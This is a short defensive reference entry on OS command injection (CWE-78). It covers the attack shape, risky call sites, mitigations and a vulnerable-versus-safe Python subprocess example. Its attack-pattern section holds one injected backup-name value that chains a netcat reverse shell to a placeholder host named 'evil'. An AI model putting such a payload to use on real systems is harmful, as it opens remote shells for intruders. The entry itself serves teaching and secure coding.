# CWE-78: OS Command Injection

## Plain-English explanation
Same shape as CWE-77 but specifically targeting an OS shell — `sh`, `bash`, `cmd.exe`, `powershell`. The attacker controls part of a string the app passes to the OS shell, and the shell interprets metacharacters they injected.

## Typical attack pattern
A backup script invokes `tar czf /backups/<name>.tgz /data`. The web UI lets users pick the backup name. The attacker enters `nightly.tgz; nc evil 4444 -e /bin/sh`. The shell happily runs the tar, then opens a reverse shell.

## Reachability hints
- `exec`, `popen`, `system` in any language, plus `child_process.exec`, `subprocess.run(..., shell=True)`, Ruby backticks (`` `cmd` ``).
- Build steps and deploy scripts that interpolate env vars or git refs into shell strings.
- `eval` in shell scripts.
- Logging utilities that pipe a user-controlled string into `logger` or `mail`.

## Common workarounds when a bump is blocked
- Argv-form execution: `execFile`/`spawn`/`subprocess.run([...], shell=False)`.
- For shell-only tools, use `shlex.quote` (Python) or `shell-escape` (Node) on every interpolated value.
- Drop privileges before the command runs (`su nobody` or container `USER`).
- AppArmor / SELinux / seccomp profile restricting which binaries the worker can exec at all.

## Concrete code example

```python
# Vulnerable
subprocess.run(f"tar czf /backups/{name}.tgz /data", shell=True, check=True)

# Safe
subprocess.run(["tar", "czf", f"/backups/{name}.tgz", "/data"], check=True)
# `name` is now one argv element; metacharacters don't go anywhere.
```
